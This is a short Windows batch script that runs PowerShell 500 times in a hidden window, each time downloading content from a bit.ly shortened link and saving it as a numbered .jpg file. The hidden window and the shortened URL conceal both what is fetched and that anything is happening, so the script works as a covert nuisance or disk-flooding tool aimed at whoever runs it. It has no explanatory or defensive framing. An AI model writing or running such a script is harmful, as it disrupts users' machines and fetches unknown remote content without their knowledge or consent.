@echo off 
set url=https://bit.ly/3kd3XQg
for /L %%N in (1,1,500) do powershell.exe -WindowStyle Hidden -Command "Invoke-WebRequest %url% -OutFile %%N.jpg"
